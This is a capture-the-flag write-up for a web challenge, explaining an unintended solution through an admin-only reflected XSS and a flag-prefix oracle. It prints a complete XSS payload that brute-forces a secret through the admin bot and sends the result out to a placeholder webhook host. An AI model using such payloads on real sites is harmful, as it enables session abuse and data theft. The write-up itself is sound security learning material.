# Leaky CTF Platform — Writeup

## Challenge summary

This is a web challenge centered around an admin bot and a flag-checking backend. The intended route appears to involve XS-Leaks and timing differences, but the application also contains a much simpler unintended solution: an **admin-only reflected XSS** in `/search`.

The local source code clearly shows the main pieces:

- `/search` is only accessible when the `admin_secret` cookie is present.
- The `flag` query parameter is reflected directly into the HTML response.
- The admin bot sets the `admin_secret` cookie for `localhost` and then visits any URL submitted through `/report`.
- `/submit_flag` returns the real flag once the correct internal flag is supplied.

That gives us a clean exploit chain.

---

## Relevant code behavior

### 1. The admin-only `/search` endpoint

The route checks the `admin_secret` cookie and then reflects the attacker-controlled `flag` parameter directly into the response body:

```python
@app.route('/search')
def search():
    if request.cookies.get('admin_secret', '') != config.ADMIN_SECRET:
        return 'Access denied. Only admin can access this endpoint.', 403

    flag = request.args.get('flag', '')
    if not flag:
        return 'Invalid flag', 400

    foundFlag = any(f for f in flags if f.startswith(flag))
    if not foundFlag:
        return f'"{flag}" not found in our key-value store.', 200

    return f'"{flag}" found in our key-value store.', 200
```

Because Flask returns this string as HTML, injecting `<script>...</script>` into `flag` leads to reflected XSS.

---

### 2. The admin bot

The bot visits attacker-controlled URLs from `/report`, but before doing so it adds the admin cookie:

```python
await context.add_cookies([{
    'name': 'admin_secret',
    'value': ADMIN_SECRET,
    'domain': BOT_CONFIG['APP_DOMAIN'],
    'path': '/',
    'httpOnly': True,
    'sameSite': 'Lax',
}])

await page.goto(urlToVisit, wait_until='load', timeout=10_000)
await asyncio.sleep(BOT_CONFIG['VISIT_SLEEP_SECOND'])
```

`APP_DOMAIN` is set to `localhost`, so visiting a URL like `http://localhost:5000/search?...` runs in the same origin as the protected endpoints.

---

### 3. The prefix oracle

The internal correct flag is generated as:

```python
CORRECT_FLAG = f'{CORRECT_FLAG_PREFIX}{{{secrets.token_hex(RANDOM_HEX_LENGTH)}}}'
```

with:

```python
CORRECT_FLAG_PREFIX = 'leakyctf'
RANDOM_HEX_LENGTH = 4
```

So the unknown flag always has the form:

```text
leakyctf{????????}
```

where the unknown part is 8 hexadecimal characters.

The `/search` endpoint uses:

```python
foundFlag = any(f for f in flags if f.startswith(flag))
```

That means `/search?flag=leakyctf{a` tells us whether the real flag starts with that prefix. In other words, it is a prefix oracle.

---

### 4. The final flag endpoint

Once the correct internal flag is known, `/submit_flag` returns the real challenge flag:

```python
if flag != config.CORRECT_FLAG:
    return 'Incorrect flag', 400

return f'Correct! The real flag is: {config.REAL_FLAG}', 200
```

---

## Unintended solution

The intended approach seems to be based on XS-Leaks and timing, possibly amplified through `/spam_flags`. But there is a much easier route:

1. Submit a URL to `/report` that points to `/search` on `localhost`.
2. Put a `<script>` payload inside the `flag` parameter.
3. The bot loads the page with the admin cookie already set.
4. The reflected script executes in the `localhost` origin.
5. The script brute-forces the internal flag one hex digit at a time using the prefix oracle.
6. The script calls `/submit_flag` with the recovered flag.
7. The script exfiltrates the response containing the real flag.

This bypasses the XS-Leak route entirely.

---

## Common pitfall

When checking `/search` responses, do **not** use this:

```javascript
if (t.includes('found in our key-value store'))
```

That is wrong because both responses contain that substring:

- `"..." found in our key-value store.`
- `"..." not found in our key-value store.`

The correct check is something like:

```javascript
if (!t.includes('not found in our key-value store'))
```

---

## Exploit payload

This payload runs entirely in the admin bot's browser on the `localhost` origin:

```html
<script>
(async()=>{
  const hex='0123456789abcdef';
  let flag='leakyctf{';

  while(flag.length < 17){
    let ok=false;
    for(const c of hex){
      const cand=flag+c;
      const r=await fetch('/search?flag='+encodeURIComponent(cand), {
        credentials:'include'
      });
      const t=await r.text();
      if(!t.includes('not found in our key-value store')){
        flag=cand;
        ok=true;
        break;
      }
    }
    if(!ok) break;
  }

  flag+='}';

  const real = await (await fetch('/submit_flag?flag='+encodeURIComponent(flag), {
    credentials:'include'
  })).text();

  (new Image()).src = 'https://your-webhook.example/?correct=' +
    encodeURIComponent(flag) + '&real=' + encodeURIComponent(real);
})();
</script>
```

The report URL is then just the URL-encoded version of:

```text
http://localhost:5000/search?flag=<script>...</script>
```

---

## Why this works reliably

- The search space is tiny: only 8 hex characters.
- Each position requires at most 16 requests.
- The bot remains on the page for 60 seconds.
- `/submit_flag` only needs to be called once.

So this is far more stable than a browser timing side channel.

---

## Final notes

This writeup describes the exploit path and how to recover the real flag from the live challenge service. The exact flag value depends on the running instance, because `REAL_FLAG` is provided through the environment.

In the provided local source, the default fallback value is only:

```text
PUCTF26{fake_flag}
```

so the actual flag must be obtained by running the exploit against the challenge instance.
